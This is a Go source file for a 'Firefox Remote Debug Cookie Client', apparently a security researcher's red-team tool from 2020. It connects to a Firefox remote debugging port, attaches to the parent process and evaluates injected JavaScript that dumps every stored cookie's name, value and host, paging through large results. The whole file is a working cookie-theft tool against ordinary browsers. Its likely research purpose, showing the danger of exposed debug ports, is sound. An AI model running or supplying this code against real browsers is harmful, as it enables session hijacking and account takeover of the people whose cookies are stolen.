// Firefox Remote Debug Cookie Client
// WUNDERWUZZI, LLC - Johann Rehberger @wunderwuzzi23
// July 2020,  MIT License

package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"strconv"
	"strings"
)

const (
	defaultCommand = `
		output = "";
		Services.cookies.cookies.forEach(async function (cookie) {
			output = output+cookie.name+":"+cookie.value+":"+cookie.rawHost+"\n\r";
		});
		output;
		`

	//defaultCommand = `Services.cookies.cookies[0].name`
)

//this is the list of various server states
const (
	stateInit      = ""
	stateList      = "processes"
	stateAttach    = "process"
	stateEvalJS    = "evaluateJSAsync"
	stateSubstring = "substring"
	stateDone      = "done"
)

//wireMessage is the central struct capabile to hold different JSON response/requests
type wireMessage struct {
	length               int
	Type                 string      `json:"type,omitempty"`
	To                   string      `json:"to,omitempty"`
	Text                 string      `json:"text,omitempty"`
	ProcessDescriptor    string      `json:"processDescriptor,omitempty"`
	TestConnectionPrefix string      `json:"testConnectionPrefix,omitempty"`
	From                 string      `json:"from,omitempty"`
	Processes            []process   `json:"processes,omitempty"`
	Process              process     `json:"process,omitempty"`
	ThreadActor          string      `json:"threadactor,omitempty"`
	Result               interface{} `json:"result,omitempty"`
	ResultID             string      `json:"resultID,omitempty"`
	Start                int         `json:"start,omitempty"`
	End                  int         `json:"end,omitempty"`
	Substring            string      `json:"substring,omitempty"` //the substring comes as part of main message, not result, odd
}

//result is a sub component of the wireMessage
type result struct {
	Type    string `json:"type,omitempty"`
	Actor   string `json:"actor,omitempty"`
	Initial string `json:"initial,omitempty"`
	Length  int    `json:"length,omitempty"`
}

//result is a sub component of the wireMessage
type process struct {
	Actor        string `json:"actor,omitempty"`
	ConsoleActor string `json:"consoleActor,omitempty"`
}

func (m *wireMessage) serialize() string {
	bytes, err := json.Marshal(m)
	if err != nil {
		fmt.Println("Error serializing to wire format.", err)
	}

	text := string(bytes)
	length := len(text)
	return strconv.Itoa(length) + ":" + text
}

//controlMessage is the channel structure sender and receiver use
type controlMessage struct {
	State       string
	WireMessage wireMessage
}

//this is the list of the methods that are invoked on the debug server
var (
	msgList            = wireMessage{Type: "listProcesses", To: "root"}
	msgGetTarget       = wireMessage{Type: "getTarget", To: "serverN.connN.processDescriptorN"}
	msgAttach          = wireMessage{Type: "attach", To: "serverN.connN.parentProcessTargetN"}
	msgEvaluateJSAsync = wireMessage{Type: "evaluateJSAsync", Text: defaultCommand, To: "serverN.connN.consoleActorN"}
	msgSubstring       = wireMessage{Type: "substring", Start: 1000, End: 186972, To: "server2.connN.longstractorN"}
)

//logger helper
var log MiniLogger

func main() {

	fmt.Print("Firefox Debug Client")
	fmt.Println(" - @wunderwuzzi23 (July 2020)")

	var server string
	var port int
	var command string

	flag.StringVar(&server, "server", "localhost", "Firefox debug server to connect to")
	flag.IntVar(&port, "port", 9222, "Port of the debug server to conenct to")
	flag.StringVar(&command, "command", defaultCommand, "buildindex, download, listapps, listapps+")
	flag.BoolVar(&log.log, "log", false, "if true then debug messages will be printed on screen")

	flag.Parse()

	//Connect to Firefox
	connString := net.JoinHostPort(server, strconv.Itoa(port))
	log.Print("Connecting to Firefox at " + connString)

	conn, err := net.Dial("tcp", connString)
	if err != nil {
		fmt.Println("*** Error connecting: ", err)
		return
	}
	log.Println(" Connected")

	c := make(chan controlMessage)
	exit := make(chan bool)

	//Sender
	go func(c chan controlMessage, exit chan bool) {

		var processesDescriptor string
		var consoleActor string
		var parentProcessTarget string

		for {

			//time.Sleep(500 * time.Millisecond)

			select {
			case cm := <-c:
				switch cm.State {

				case stateInit:
					//Step 1: ListProcesses
					sendhelper(conn, msgList.serialize())

				case stateList:
					//Step 2: GetTarget
					for _, v := range cm.WireMessage.Processes {
						processesDescriptor = v.Actor
						break
					}

					msgGetTarget.To = processesDescriptor
					sendhelper(conn, msgGetTarget.serialize())

				case stateAttach:
					//Step 2: Attach
					parentProcessTarget = cm.WireMessage.Process.Actor
					consoleActor = cm.WireMessage.Process.ConsoleActor

					msgAttach.To = parentProcessTarget
					sendhelper(conn, msgAttach.serialize())

				case stateEvalJS:
					//Step 3: EvaulateJSAsync
					msgEvaluateJSAsync.To = consoleActor
					sendhelper(conn, msgEvaluateJSAsync.serialize())

				case stateSubstring:
					//Step 4: Substring - a lot of output requires a second request called "substring"
					result, ok := cm.WireMessage.Result.(map[string]interface{})
					if ok {
						actor := result["actor"].(string)
						length := result["length"].(float64)

						msgSubstring.To = actor
						msgSubstring.Start = 1000
						msgSubstring.End = int(length)
						sendhelper(conn, msgSubstring.serialize())
						log.Println("Substring sent")
					}

				case stateDone:
					log.Println("Sender Done")
					exit <- true
					return

				default:
					log.Print("No cookies yet,...")

				}

			}
		}

	}(c, exit)

	//Receiver
	go func(c chan controlMessage, exit chan bool) {

		for {
			rb := receivehelper(conn)
			log.Println("*** Raw Response Result: " + string(rb))

			var wm wireMessage
			err := json.Unmarshal(rb, &wm)
			if err != nil {
				fmt.Println("*** Error unmarshaling result: ", err)
			}

			state := stateInit

			//deciphering what "kind" of response we got
			//and set the state accordingly

			if wm.Processes != nil {
				state = stateList
			}

			if wm.Process.Actor != "" {
				state = stateAttach
			}

			if wm.ThreadActor != "" {
				state = stateEvalJS
			}

			if wm.ResultID != "" {
				state = stateEvalJS
			}

			//Result (from evaluateJSAsync) is overloaded can be a struct or string

			//if it's a struct - we need to do paging with substring
			result, ok := wm.Result.(map[string]interface{})

			log.Println(fmt.Sprintf("Bool: %v Result: %v", ok, wm.Result))
			if ok {
				if result["initial"] != "" {
					log.Println("Result:")
					fmt.Print(result["initial"])
					state = stateSubstring
				}
			} else {
				log.Println("Not a struct, attempting string")
				// if its a string
				resultstring, ok := wm.Result.(string)
				if ok {
					log.Println("looks like its a string result")
					if resultstring != "" {
						fmt.Println(resultstring)
						state = stateDone
					}
				}
			}
			/// end of weird evaluateJSAsync Type handling

			if wm.Substring != "" {
				fmt.Println(wm.Substring)
				state = stateDone
			}

			log.Println("Final State: " + state)

			//send message to sender to continue in flow
			cm := controlMessage{State: state, WireMessage: wm}
			c <- cm

			if state == stateDone {
				log.Println("Receiver Done.")
				exit <- true
				return
			}

		}
	}(c, exit)

	<-exit
	<-exit

	log.Println("Done.")
}

func sendhelper(conn net.Conn, message string) {
	log.Println("Request: " + message)
	fmt.Fprintf(conn, message)
}

func receivehelper(conn net.Conn) []byte {

	reader := bufio.NewReader(conn)

	response, err := reader.ReadString(':')
	if err != nil {
		fmt.Println("*** Error reading response: ", err)
	}

	length := strings.Trim(response, ":")
	numBytes, _ := strconv.Atoi(length)

	var messageBytes []byte
	for i := 0; i < numBytes; i++ {
		b, _ := reader.ReadByte()
		messageBytes = append(messageBytes, b)
	}

	return messageBytes
}

// MiniLogger is a tiny basic logger
type MiniLogger struct {
	log bool
}

// Println is used to write a log line on screen
func (l *MiniLogger) Println(text string) {
	if l.log {
		fmt.Println(text)
	}
}

// Print is used to write a log line on screen
func (l *MiniLogger) Print(text string) {
	if l.log {
		fmt.Print(text)
	}
}
